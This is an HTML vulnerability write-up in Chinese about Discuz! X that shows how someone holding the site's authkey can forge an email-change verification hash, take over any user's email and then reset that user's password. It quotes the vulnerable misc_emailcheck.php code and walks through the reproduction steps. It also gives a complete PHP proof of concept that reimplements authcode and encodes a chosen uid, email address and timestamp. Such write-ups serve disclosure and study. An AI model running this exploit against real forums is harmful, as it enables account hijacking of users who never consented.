<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="discuz-x-authkey-重置任意账户邮箱"><span class="csDE05BCC">Discuz! X authkey </span><span class="csECDA2D3">重置任意账户邮箱</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">需要得到</span><span class="cs8926E06">authkey</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">当我们申请修改邮箱的时候，我们会受到一封类似于下面这样的邮件。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X%20authkey%20%e9%87%8d%e7%bd%ae%e4%bb%bb%e6%84%8f%e8%b4%a6%e6%88%b7%e9%82%ae%e7%ae%b1_files/image0.png" width="560" height="157" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">验证链接类似于</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org/dz3.3/home.php?mod=misc&amp;ac=emailcheck&amp;hash=0eb7yY2wtS1q16Zs2%2BtSkR6w5O%2Fx6jdLbu0FnWbegB8ixs2Y6tfcyAnrvz4yPIE7pKzoqawU0ku47y4F</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟入</span><span class="cs9FB05234">/source/include/misc/misc_emailcheck.php</span><span class="cs8926E06"> </span><span class="cs9C1B1871">代码如下：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/**</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> * &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Discuz!] (C)2001-2099 Comsenz Inc.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> * &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This is NOT a freeware, use is subject to license terms</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> *</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> * &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$Id: misc_emailcheck.php 33688 2013-08-02 03:00:15Z nemohou $</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> */</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if(!defined(&#39;IN_DISCUZ&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit(&#39;Access Denied&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$uid = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$email = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$_GET[&#39;hash&#39;] = empty($_GET[&#39;hash&#39;]) ? &#39;&#39; : $_GET[&#39;hash&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if($_GET[&#39;hash&#39;]) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;list($uid, $email, $time) = explode(&quot;\t&quot;, authcode($_GET[&#39;hash&#39;], &#39;DECODE&#39;, md5(substr(md5($_G[&#39;config&#39;][&#39;security&#39;][&#39;authkey&#39;]), 0, 16))));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$uid = intval($uid);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// exit($email);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if($uid &amp;&amp; isemail($email) &amp;&amp; $time &gt; TIMESTAMP - 86400) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$member = getuserbyuid($uid);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$setarr = array(&#39;email&#39;=&gt;$email, &#39;emailstatus&#39;=&gt;&#39;1&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if($_G[&#39;member&#39;][&#39;freeze&#39;] == 2) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$setarr[&#39;freeze&#39;] = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;loaducenter();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ucresult = uc_user_edit(addslashes($member[&#39;username&#39;]), &#39;&#39;, &#39;&#39;, $email, 1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if($ucresult == -8) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;showmessage(&#39;email_check_account_invalid&#39;, &#39;&#39;, array(), array(&#39;return&#39; =&gt; true));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} elseif($ucresult == -4) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;showmessage(&#39;profile_email_illegal&#39;, &#39;&#39;, array(), array(&#39;return&#39; =&gt; true));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} elseif($ucresult == -5) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;showmessage(&#39;profile_email_domain_illegal&#39;, &#39;&#39;, array(), array(&#39;return&#39; =&gt; true));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} elseif($ucresult == -6) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;showmessage(&#39;profile_email_duplicate&#39;, &#39;&#39;, array(), array(&#39;return&#39; =&gt; true));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if($_G[&#39;setting&#39;][&#39;regverify&#39;] == 1 &amp;&amp; $member[&#39;groupid&#39;] == 8) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$membergroup = C::t(&#39;common_usergroup&#39;)-&gt;fetch_by_credits($member[&#39;credits&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$setarr[&#39;groupid&#39;] = $membergroup[&#39;groupid&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;updatecreditbyaction(&#39;realemail&#39;, $uid);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;C::t(&#39;common_member&#39;)-&gt;update($uid, $setarr);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;C::t(&#39;common_member_validate&#39;)-&gt;delete($uid);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;dsetcookie(&#39;newemail&#39;, &quot;&quot;, -1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;showmessage(&#39;email_check_sucess&#39;, &#39;home.php?mod=spacecp&amp;ac=profile&amp;op=password&#39;, array(&#39;email&#39; =&gt; $email));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;showmessage(&#39;email_check_error&#39;, &#39;index.php&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当</span><span class="cs8926E06">hash</span><span class="cs9C1B1871">传入的时候，服务端会调用</span><span class="cs8926E06">authcode</span><span class="cs9C1B1871">函数解码获得用户的</span><span class="cs8926E06">uid</span><span class="cs9C1B1871">，要修改成的</span><span class="cs8926E06">email</span><span class="cs9C1B1871">，时间戳。</span></p><p class="cs3A447A38"><span class="cs9FB05234">list($uid, $email, $time) = explode(&quot;\t&quot;, authcode($_GET[&#39;hash&#39;], &#39;DECODE&#39;, md5(substr(md5($_G[&#39;config&#39;][&#39;security&#39;][&#39;authkey&#39;]), 0, 16))));</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后经过一次判断</span></p><p class="cs3A447A38"><span class="cs9FB05234">if($uid &amp;&amp; isemail($email) &amp;&amp; $time &gt; TIMESTAMP - 86400) {</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里没有任何额外的判断，在接下来的部分，也仅仅对</span><span class="cs8926E06">uid</span><span class="cs9C1B1871">的有效性做了判断，而</span><span class="cs8926E06">uid</span><span class="cs9C1B1871">代表这用户的</span><span class="cs8926E06">id</span><span class="cs9C1B1871">值，是从</span><span class="cs8926E06">1</span><span class="cs9C1B1871">开始自增的。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">也就是说，只要</span><span class="cs8926E06">authcode</span><span class="cs9C1B1871">函数解开</span><span class="cs8926E06">hash</span><span class="cs9C1B1871">值，就能成功的验证并修改邮箱。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里我们可以直接使用</span><span class="cs8926E06">authcode</span><span class="cs9C1B1871">函数来获得</span><span class="cs8926E06">hash</span><span class="cs9C1B1871">值</span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">这里需要修改</span><span class="cs8926E06">md5(&quot;authkey&quot;)</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//Enter your code here, enjoy!</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function authcode($string, $operation = &#39;DECODE&#39;, $key = &#39;&#39;, $expiry = 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ckey_length = 4;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$key = md5($key ? $key : UC_KEY);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$keya = md5(substr($key, 0, 16));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$keyb = md5(substr($key, 16, 16));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$keyc = $ckey_length ? ($operation == &#39;DECODE&#39; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$cryptkey = $keya.md5($keya.$keyc);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$key_length = strlen($cryptkey);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$string = $operation == &#39;DECODE&#39; ? base64_decode(substr($string, $ckey_length)) : sprintf(&#39;%010d&#39;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$string_length = strlen($string);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$result = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$box = range(0, 255);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$rndkey = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for($i = 0; $i &lt;= 255; $i++) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for($j = $i = 0; $i &lt; 256; $i++) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$j = ($j + $box[$i] + $rndkey[$i]) % 256;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tmp = $box[$i];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$box[$i] = $box[$j];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$box[$j] = $tmp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for($a = $j = $i = 0; $i &lt; $string_length; $i++) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$a = ($a + 1) % 256;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$j = ($j + $box[$a]) % 256;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tmp = $box[$a];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$box[$a] = $box[$j];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$box[$j] = $tmp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if($operation == &#39;DECODE&#39;) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return substr($result, 26);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $keyc.str_replace(&#39;=&#39;, &#39;&#39;, base64_encode($result));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo authcode(&quot;3\ttest@success.com\t1503556905&quot;, &#39;ENCODE&#39;, md5(substr(md5(&quot;5e684ceqNxuCvmoK&quot;), 0, 16)));</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">访问</span><span class="cs8926E06">hash</span><span class="cs9C1B1871">页面，我们可以看到验证邮箱已经被修改了，接下来我们可以直接通过忘记密码来修改当前用户的密码。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X%20authkey%20%e9%87%8d%e7%bd%ae%e4%bb%bb%e6%84%8f%e8%b4%a6%e6%88%b7%e9%82%ae%e7%ae%b1_files/image1.png" width="560" height="194" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://lorexxar.cn/2017/08/31/dz-authkey/#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85</span></p></body>
</html>
